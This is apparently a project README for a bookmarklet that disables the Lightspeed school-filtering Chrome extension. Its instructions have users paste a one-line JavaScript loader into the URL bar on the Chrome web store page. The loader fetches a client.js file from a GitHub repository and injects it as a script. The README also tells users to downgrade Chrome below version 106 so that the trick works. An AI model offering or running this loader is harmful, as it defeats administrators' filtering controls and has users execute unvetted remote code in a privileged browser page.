# What is this?
This is a [bookmarklet](https://en.wikipedia.org/wiki/Bookmarklet) that lets you disable the lightspeed chrome extension.  

This bookmarklet has certain dependencies which will be covered. It is currently in the earliest stage of development, and many features such as games, proxies (and connection to proxy servers) will be added.

# How to use

1. go to https://chrome.google.com/webstoreunblocker  
2. in the URL bar, type "javascript:" (without the quotes)
3. copy the following code: ```var req=new XMLHttpRequest;if(req.open("GET","https://raw.githubusercontent.com/fcpsedu/ls/main/client.js",!1),req.send(null),200==req.status){var code=req.responseText,a=document.createElement("script");a.innerHTML=code,document.head.appendChild(a)}```
4. press ENTER. Make sure that you are not searching, but the javascript is working. Please reffer to the bookmarklet link above and read about them on wikipedia if you do not understand.
5. Wait for it to load. Once it does, you can go to chrome://extensions and check if lightspeed extension has been turned off. If it does not work and you have met all of the requirements (below), please open an issue.

# Requirements

You must have chrome release candidate < 106.0.5249.126 (aka your chrome browser version MUST be lower than 106, and not the latest version of chrome 102 (google your version to confirm).
You can downgrade your version of chrome by flashing a recovery image from chrome100.dev. You must also have javascript enabled. After you have downgraded to that version (or if you are on it), go to google.com and in the url bar, type ```javascript:alert('test')``` and press enter. If a popup saying test does not pop up, try downgrading and the same thing again. 

Please get the latest version of chrome 105 from chrome100.dev. Follow the instructions on that site.
